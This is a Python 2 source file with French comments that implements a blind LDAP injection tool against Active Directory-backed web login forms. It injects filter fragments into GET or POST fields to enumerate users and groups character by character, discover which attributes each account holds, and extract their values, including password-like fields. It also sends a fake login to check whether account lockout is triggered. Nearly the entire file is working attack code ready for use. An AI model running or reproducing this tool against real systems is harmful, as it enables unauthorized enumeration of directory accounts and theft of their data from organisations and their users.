#!/usr/bin/python
# -*-coding: utf-8 -*-
import urllib , urllib2
import sys

class colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

	
#retourne True si la requete envoyée precedement à un impact sur le serveur
def blindInjectionResponse(keyword_FALSE,keyword_TRUE,contenu_page_reponse):
	#si on utilise le parametre keyword False
	if (not keyword_TRUE):
		#si le mot clé n'est pas présent dans la page
		if not keyword_FALSE in contenu_page_reponse:
			return True
	#si on utilise le parametre keyword False
	else:
		#si le mot clé est présent dans la page
		if keyword_TRUE in contenu_page_reponse:
			return True	
	
#retourne True si le fichier de conf est correct, retroune False sinon
def checkConfigFile(keyword_FALSE,keyword_TRUE,methode):
	print colors.BOLD + "(*) Vérification du fichier de configuration 'settings.ini' " + colors.ENDC

	#verification des parametres keyword_TRUE et keyword_FALSE
	if (not keyword_FALSE):
		if (not keyword_TRUE):
			print colors.RED + "   (!) Fichier Settings.ini incorrect" + colors.ENDC
			print colors.RED + "   (!) Keyword_TRUE et keyword_FALSE sont vide" + colors.ENDC
			return False
	elif(keyword_TRUE):
		print colors.RED + "   (!) Fichier Settings.ini incorrect" + colors.ENDC
		print colors.RED + "   (!) Il faut en choisir un seul entre Keyword_TRUE et keyword_FALSE" + colors.ENDC
		return False
		
	
	#verification du parametre methode
	if ((methode == "GET") or (methode == "POST")):
		return True
	else:
		print colors.RED + "   (!) Fichier Settings.ini incorrect" + colors.ENDC
		print colors.RED + "   (!) L'attribut 'methode' ne peut contenir que 'POST' ou 'GET'" + colors.ENDC
		return False
#retourne le contenu de la page web de la réponse à la requête
def SendRequest(methode,url,champ,suffixe):
			#si methode GET
			if (methode == "GET"):
				page = url + "?" + champ + suffixe
				req = urllib2.Request(page)
				result = urllib2.urlopen(req)
				contenu_page=result.read()
				return contenu_page
			
			#Si methode POST
			elif (methode == "POST"):
				value = champ + suffixe
				req = urllib2.Request(url,value)
				result = urllib2.urlopen(req)
				contenu_page=result.read()
				return contenu_page
			
			else:
				print colors.RED + "   (!) Erreur: saisie methode incorrecte" + colors.ENDC

#retourne true si le fichier existe ou false sinon				
def file_exists(fichier):
   try:
      file(fichier)
      return True
   except:
      return False

#retourne True si les comptes sont succeptibles d'etre bloqués et False sinon
def checkAccountBlocking(liste_names,url,champ,keyword_FALSE,keyword_TRUE,methode):
	blindInjection = False
	badpass = 0
	liste_names_available = []
	nameTest1 = ""
	
	
	#le compte admin ne peut pas se bloquer donc il est nécessaire de verifier deux comptes utilisateurs pour etre sur que l'injection ne bloque aucun compte
	accountsChecked = 0
	
	#On verifie si les comptes peuvent se bloquer en testant des users de la liste "liste_names"
	#Si le compte d'un user de cette liste à déja été bloqué, on passe au suivant pour etre sur de ne pas bloquer de compte
	print "\r"
	print colors.BOLD + "(*) Vérification du blocage des comptes d'utilisateur... " + colors.ENDC
	
	#on teste si les users renseignés existent
	for name in liste_names:
		suffixe = ")(samAccountName="+name+")(badPwdCount=*"
		contenu_page_reponse = SendRequest(methode,url,champ,suffixe)
		
		#si le user Existe on le met dans une liste
		blindInjection = blindInjectionResponse(keyword_FALSE,keyword_TRUE,contenu_page_reponse)
		if (blindInjection):
			liste_names_available.append(name)
			blindInjection = False
			
	
	#si aucun user n'existe
	if (not liste_names_available):
		print "   (!) "  + colors.RED + "Aucun des Users renseignés n'existe" + colors.ENDC
		return True
	else:
		#on teste si badPwdCount s'incremente après une requête
		for name in liste_names_available:
			suffixe = ")(samAccountName="+name+")(badPwdCount="+str(badpass)
			contenu_page_reponse = SendRequest(methode,url,champ,suffixe)
			blindInjection = blindInjectionResponse(keyword_FALSE,keyword_TRUE,contenu_page_reponse)
			
			#si badPwdCount=0						
			if (blindInjection):
				accountsChecked = accountsChecked + 1
				#badPwdCount passe a 1
				badpass = badpass + 1
				blindInjection = False
				
				
				
				'''
				
				#-------------------------------- INFOS FROM USER -------------------------------------
				#demande à l'utilisateur de saisir le nombre de paramètres d'une requete sur le serveur cible
				print "\r"
				parametre = raw_input(colors.BOLD + "(*) Veuillez renseigner le nombre de paramètre dans la requête" + colors.ENDC)
				
				#on demande le nom de chaque parametre
				for i in range [0,int(parametre)]:
					name_parametre[i] = raw_input(colors.BOLD + "(*) Saisissez le nom du parametre "+ str(i+1) +" (ex: username): " + colors.ENDC)

				#--------------------------------------------------------------------------------------
				
				for parametre in name_parametre:
					monchamp = monchamp + parametre + "="
				
				'''
				
				
				#On envoie une requete de connexion avec un mot de passe bidon pour essayer d'incrementer l'attribut badPwdCount sur l'AD
				monchamp = "username="+name+"&password=tototata"
				monsuffixe = ""
				SendRequest(methode,url,monchamp,monsuffixe)
				
				#on recupere l'atttribut badpwdCount
				suffixe = ")(samAccountName="+name+")(badPwdCount="+str(badpass)
				contenu_page_reponse = SendRequest(methode,url,champ,suffixe)
				blindInjection = blindInjectionResponse(keyword_FALSE,keyword_TRUE,contenu_page_reponse)
				
				#si badPwdCount=1
				if (blindInjection):
					#badPwdCount passe a 2
					badpass = badpass + 1
					print "   (!) "  + colors.RED + "Risque de blocage de compte" + colors.ENDC
					print "   (!) "  + colors.RED + "Attention, à l'issu de ce test, BadPwdCount=" + str(badpass) + " pour le user '" + name + "'" + colors.ENDC
					#print "   (!) "  + colors.RED + "Test réalisé avec: " + name + colors.ENDC
					return True
				
				badpass = 0
				
				#avant dernier user de test
				nameTest2 = nameTest1
				#dernier user de test
				nameTest1 = name
				
	
		#si badPwdCount ne s'est pas incrémenté apres la requete d'auth bidon et que la verification s'est effectué sur au moins deux comptes utilisateurs
		if (accountsChecked >= 2):
			print "   (+) "  + colors.GREEN + "Pas de blocage de compte" + colors.ENDC
			#print "   (+) "  + colors.GREEN + "Tests réalisé avec: " + nameTest2 +" puis " + nameTest1 + colors.ENDC
			blindInjection = False
			return False
		#si seulement 1 user /2 requis possède lattribut badPwdCount à 0
		else:
			print "   (!) "  + colors.RED + "Verification impossible" + colors.ENDC
			print "   (!) "  + colors.RED + "Veuillez ajouter dans le fichier de configuration des users suceptibles d'exister avec 0 blocage à leur actif " + colors.ENDC
			return True
	

def find_users(url,champ,methode,dico,keyword_FALSE,keyword_TRUE):
	blindInjection = False
	users = []
	
	print colors.BOLD + "(*) Recherche des users en cours...  (ctrl+c to stop)" + colors.ENDC
	try:
		users=[]
		def searchUsers(mot):
			motFini = True
			for carac in dico:
				suffixe = ")(objectclass=user)(objectclass=person)(cn=" + mot + carac + "*"
				contenu_page_reponse = SendRequest(methode,url,champ,suffixe)
				
				#reponse booleenne du serveur si l'injection est bonne
				blindInjection = blindInjectionResponse(keyword_FALSE,keyword_TRUE,contenu_page_reponse)
				if (blindInjection):
					blindInjection = False
					
					#on passe à la lettre d'après
					searchUsers(mot + carac)
					#si le mot n'est pas terminé
					motFini = False
					
			#on ajoute le user dans la liste au moment ou on cherche la premiere lettre du user suivant
			if ((mot != "") & (motFini)):
				users.append(mot)
				print "   (+) "+mot

		searchUsers("")

		#si auncun user trouvé
		if (not users):
			print colors.RED + "   (!) Erreur: Aucun user trouvé, le filtre de recherche sur le site Web ne permet pas de trouver les users " + colors.ENDC
			sys.exit(0)

	#on arrete de chercher les users quand l'utilisateur presse ctr+c
	except KeyboardInterrupt:
		print "\r"

def find_groups(url,champ,methode,dico,keyword_FALSE,keyword_TRUE):
	blindInjection = False
	groups = []
	
	print colors.BOLD + "(*) Recherche des groupes en cours...  (ctrl+c to stop)" + colors.ENDC
	try:
		groups=[]
		def searchGroups(mot):
			motFini = True
			for carac in dico:
				suffixe = ")(|(objectclass=group)(objectclass=groupofnames)(objectclass=groupofuniquenames))(cn="+mot+carac+"*"
				contenu_page_reponse = SendRequest(methode,url,champ,suffixe)
		
				#si le serveur répond true
				blindInjection = blindInjectionResponse(keyword_FALSE,keyword_TRUE,contenu_page_reponse)
				if (blindInjection):
					blindInjection = False
					#on passe à la lettre d'après
					searchGroups(mot + carac)

					#si le mot n'est pas terminé
					motFini = False	
					
			#on ajoute le user dans la liste au moment ou on cherche la premiere lettre du user suivant
			if ((mot != "") & (motFini)):
				groups.append(mot)
				print "   (+) "+mot

		searchGroups("")

		#si auncun user trouvé
		if (not groups):
			print colors.RED + "   (!) Erreur: Aucun groupe trouvé, problème avec le filtre de recherche" + colors.ENDC

	#on arrete de chercher les users quand l'utilisateur presse ctr+c
	except KeyboardInterrupt:
		print "\r"

def find_all_attributes(user,url,champ,methode,dico,keyword_FALSE,keyword_TRUE,attributes_available_TEXT,attributes_available_INT):
	blindInjection = False
	
	#on parcourt la liste de TEXT
	for attribut in attributes_available_TEXT:
		continuer=True
		passwd=""

		for t in range(0,50):
			if continuer :
				continuer = False

				for carac in dico:
					suffixe = ")(samAccountName="+user+")("+attribut+"="+passwd+carac+"*"
					contenu_page_reponse = SendRequest(methode,url,champ,suffixe)
					
					#si le serveur répond true
					blindInjection = blindInjectionResponse(keyword_FALSE,keyword_TRUE,contenu_page_reponse)
					if (blindInjection):
						blindInjection = False
						passwd+=carac
						continuer=True
						break

			else:
				if passwd:
					print "   (+) " + attribut + ": " + colors.GREEN + passwd + colors.ENDC
					break
				else:
					print colors.RED + "   (!) Impossible de récupérer l'attribut: '" +attr+"' car pas de type 'TEXT'" + colors.ENDC
					break


	#on parcourt la liste de INT
	for attr in attributes_available_INT:
		#for carac in dico_numbers:
		for chiffre in range (0,25):
			suffixe = ")(samAccountName="+user+")("+attr+"="+str(chiffre)
			contenu_page_reponse = SendRequest(methode,url,champ,suffixe)
					
			# si trouvé
			blindInjection = blindInjectionResponse(keyword_FALSE,keyword_TRUE,contenu_page_reponse)
			if (blindInjection):
				blindInjection = False
				solution = str(chiffre)

		if solution:
			print "   (+) " + attr + ": " + colors.GREEN + solution + colors.ENDC

		else:
			print colors.RED + "   (!) impossible de récupérer l'attribut: '" +attr+"' car sa valeur > 25'" + colors.ENDC

#retourne la liste des attributs texte disponibles pour 1 user		
def find_attributes_available_TEXT(user,url,champ,methode,attributs_AD_TEXT,keyword_FALSE,keyword_TRUE,dico):
	blindInjection = False
	attributes_available_TEXT = []
	
	for attr in attributs_AD_TEXT:
		suffixe = ")(samAccountName="+user+")("+attr+"=*"
		contenu_page_reponse = SendRequest(methode,url,champ,suffixe)
		
		#si résultat trouvé
		blindInjection = blindInjectionResponse(keyword_FALSE,keyword_TRUE,contenu_page_reponse)
		if (blindInjection):
			blindInjection = False
			attributes_available_TEXT.append(attr)

	return attributes_available_TEXT

#retourne la liste des attributs INT disponibles pour 1 user	
def find_attributes_available_INT(user,url,champ,methode,attributs_AD_INT,keyword_FALSE,keyword_TRUE,dico):
	blindInjection = False
	attributes_available_INT = []
	
	for attr in attributs_AD_INT:
		suffixe = ")(samAccountName="+user+")("+attr+"=*"
		contenu_page_reponse = SendRequest(methode,url,champ,suffixe)
		
		#si résultat trouvé
		blindInjection = blindInjectionResponse(keyword_FALSE,keyword_TRUE,contenu_page_reponse)
		if (blindInjection):
			blindInjection = False
			attributes_available_INT.append(attr)

	return attributes_available_INT

def find_attribute(user,selected_attribut,attributes_available_TEXT,attributes_available_INT,url,champ,methode,dico,keyword_FALSE,keyword_TRUE):
	blindInjection = False

	
	#si attribut de type TEXT
	if selected_attribut in attributes_available_TEXT:
		continuer=True
		passwd=""

		for t in range(0,50):
			if continuer :
				continuer = False

				for carac in dico:
					suffixe = ")(samAccountName="+user+")("+selected_attribut+"="+passwd+carac+"*"
					contenu_page_reponse = SendRequest(methode,url,champ,suffixe)
		
					#si le serveur répond true
					blindInjection = blindInjectionResponse(keyword_FALSE,keyword_TRUE,contenu_page_reponse)
					if (blindInjection):
						blindInjection = False
						passwd+=carac
						continuer=True
						break

			else:
				if passwd:
					print "   (+) " + selected_attribut + ": " + colors.GREEN + passwd + colors.ENDC
					break
				else:
					print colors.RED + "   (!) Impossible de récupérer l'attribut: '" +selected_attribut+"' car pas de type 'TEXT'" + colors.ENDC
					break
	#si attribut de type INTEGER
	elif selected_attribut in attributes_available_INT:
		for chiffre in range (0,25):
			suffixe = ")(samAccountName="+user+")("+selected_attribut+"="+str(chiffre)
			contenu_page_reponse = SendRequest(methode,url,champ,suffixe)

			# si trouvé
			blindInjection = blindInjectionResponse(keyword_FALSE,keyword_TRUE,contenu_page_reponse)
			if (blindInjection):
				blindInjection = False
				solution = str(chiffre)
		if solution:
			print "   (+) " + selected_attribut + ": " + colors.GREEN + solution + colors.ENDC
		else:
			print colors.RED + "   (!) Impossible de récupérer l'attribut: '" +selected_attribut+"' car sa valeur > 25'" + colors.ENDC